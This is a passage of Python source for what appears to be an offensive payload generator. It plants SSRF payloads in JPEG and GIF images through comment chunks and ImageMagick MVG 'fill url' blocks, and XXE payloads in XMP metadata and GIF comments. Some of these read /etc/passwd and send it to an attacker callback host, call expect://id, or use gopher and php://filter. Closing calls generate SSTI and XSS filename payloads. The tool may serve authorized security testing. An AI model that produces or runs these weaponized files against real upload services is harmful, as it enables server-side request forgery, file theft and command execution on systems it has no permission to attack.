                9: "mvg_ldap", 10: "mvg_file", 11: "mvg_image_https", 12: "mvg_image_http",
                13: "svg_embedded", 14: "mvg_msl", 15: "mvg_epi", 16: "mvg_ps",
                17: "mvg_text", 18: "svg_multi", 19: "mvg_rar", 20: "mvg_zip",
                21: "itxt_url"
            }
            
            if ext == 'jpg' or ext == 'jpeg':
                for ssrf_num in range(1, 22):
                    if ssrf_num in ssrf_payloads:
                        ssrf_suffix = ssrf_names.get(ssrf_num, f"ssrf{ssrf_num}")
                        img_path = ssrf_dir / f"ssrf{ssrf_num}_{ssrf_suffix}.{file_ext}"
                        img.save(img_path, img_format)
                        with open(img_path, 'rb') as f:
                            img_data = bytearray(f.read())
                        
                        if ssrf_num == 1:
                            ssrf_payload = ssrf_payloads[ssrf_num].encode('utf-8')
                            com_marker = b'\xFF\xFE'
                            com_length = struct.pack('>H', len(ssrf_payload) + 2)
                            com_chunk = com_marker + com_length + ssrf_payload
                            soi_pos = img_data.find(b'\xFF\xD8')
                            if soi_pos != -1:
                                insert_pos = soi_pos + 2
                                img_data[insert_pos:insert_pos] = com_chunk
                        else:
                            mvg_payload = f'''push graphic-context
viewbox 0 0 640 480
fill url({ssrf_payloads[ssrf_num]})
pop graphic-context'''
                            img_data = add_mvg_to_jpeg(img_data, mvg_payload)
                        
                        with open(img_path, 'wb') as f:
                            f.write(img_data)
            
            elif ext == 'gif':
                for ssrf_num in range(1, 22):
                    if ssrf_num in ssrf_payloads:
                        ssrf_suffix = ssrf_names.get(ssrf_num, f"ssrf{ssrf_num}")
                        mvg_payload = f'''push graphic-context
viewbox 0 0 640 480
fill url({ssrf_payloads[ssrf_num]})
pop graphic-context'''
                        gif_content = add_mvg_to_gif(gif_header, gif_trailer, mvg_payload)
                        with open(ssrf_dir / f"ssrf{ssrf_num}_{ssrf_suffix}.gif", 'wb') as f:
                            f.write(gif_content)
        
        if should_generate_type('xxe'):
            xxe_payloads = {
                1: f'''<!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-1">%x;]><x>test</x>''',
                2: f'''<!DOCTYPE x [<!ENTITY % remote SYSTEM "{base_url}/xxe-xmp">%remote;]><xmp>test</xmp>''',
                3: f'''<!DOCTYPE x [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % remote SYSTEM "{base_url}/xxe-xmp-file?%file;">%remote;]><xmp>test</xmp>''',
                4: f'''<!DOCTYPE x [<!ENTITY % ext SYSTEM "{base_url}/xxe-xmp-param">%ext;]><xmp>&data;</xmp>''',
                5: f'''<!DOCTYPE x [<!ENTITY % remote SYSTEM "{base_url}/xxe-xmp-nested"><!ENTITY % nested "<!ENTITY &#37; send SYSTEM '{base_url}/xxe-xmp-nested-send?%remote;'>">%nested;%send;]><xmp>test</xmp>''',
                6: f'''<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE svg [<!ENTITY % remote SYSTEM "{base_url}/xxe-svg">%remote;]><rect width="100" height="100"/></svg>''',
                7: f'''<!DOCTYPE x [<!ENTITY % data SYSTEM "data://text/plain;base64,PCFFTlRJVFkgJSB4IFNZU1RFTSAie2Jhc2VfdXJsfS94eGUtZGF0YSI+JXg7"><!ENTITY % remote SYSTEM "{base_url}/xxe-xmp-data?%data;">%remote;]><xmp>test</xmp>''',
                8: f'''<!DOCTYPE x [<!ENTITY % remote SYSTEM "expect://id">%remote;]><xmp>test</xmp>''',
                9: f'''<!DOCTYPE x [<!ENTITY % remote SYSTEM "gopher://{burp_collab}/xxe-gopher">%remote;]><xmp>test</xmp>''',
                10: f'''<!DOCTYPE x [<!ENTITY % remote SYSTEM "php://filter/read=string.rot13/resource={base_url}/xxe-php">%remote;]><xmp>test</xmp>''',
                11: f'''<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % x SYSTEM "{base_url}/xxe-text">%x;]><x>test</x>'''
            }
            
            xxe_names = {
                1: "itxt", 2: "xmp_entity", 3: "xmp_file", 4: "xmp_param",
                5: "xmp_nested", 6: "svg_itxt", 7: "xmp_data", 8: "xmp_expect",
                9: "xmp_gopher", 10: "xmp_phpfilter", 11: "text_chunk"
            }
            
            if ext == 'jpg' or ext == 'jpeg':
                for xxe_num in range(1, 12):
                    if xxe_num in xxe_payloads:
                        xxe_suffix = xxe_names.get(xxe_num, f"xxe{xxe_num}")
                        img_path = xxe_dir / f"xxe{xxe_num}_{xxe_suffix}_app1.{file_ext}"
                        img.save(img_path, img_format)
                        with open(img_path, 'rb') as f:
                            img_data = bytearray(f.read())
                        
                        xmp_payload = f'''<?xml version="1.0"?>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
<rdf:Description rdf:about="">
<dc:title>{xxe_payloads[xxe_num]}</dc:title>
</rdf:Description>
</rdf:RDF>
</x:xmpmeta>'''.encode('utf-8')
                        
                        app1_marker = b'\xFF\xE1'
                        app1_identifier = b'http://ns.adobe.com/xap/1.0/\x00'
                        app1_length = struct.pack('>H', len(xmp_payload) + len(app1_identifier) + 2)
                        app1_chunk = app1_marker + app1_length + app1_identifier + xmp_payload
                        
                        soi_pos = img_data.find(b'\xFF\xD8')
                        if soi_pos != -1:
                            insert_pos = soi_pos + 2
                            img_data[insert_pos:insert_pos] = app1_chunk
                        
                        with open(img_path, 'wb') as f:
                            f.write(img_data)
            
            elif ext == 'gif':
                for xxe_num in range(1, 12):
                    if xxe_num in xxe_payloads:
                        xxe_suffix = xxe_names.get(xxe_num, f"xxe{xxe_num}")
                        comment_extension = b'\x21\xFE'
                        comment_payload = xxe_payloads[xxe_num].encode('utf-8')
                        comment_length = bytes([min(len(comment_payload), 255)])
                        comment_chunk = comment_extension + comment_length + comment_payload + b'\x00'
                        gif_content = gif_header + comment_chunk + gif_trailer
                        with open(xxe_dir / f"xxe{xxe_num}_{xxe_suffix}_comment.gif", 'wb') as f:
                            f.write(gif_content)
    
    if generate_ssti_filename_payloads and should_generate_type('ssti'):
        generate_ssti_filename_payloads(output_dir, ext, burp_collab, tech_filter)
    
    if generate_xss_filename_payloads and should_generate_type('xss'):
        generate_xss_filename_payloads(output_dir, ext, burp_collab, tech_filter)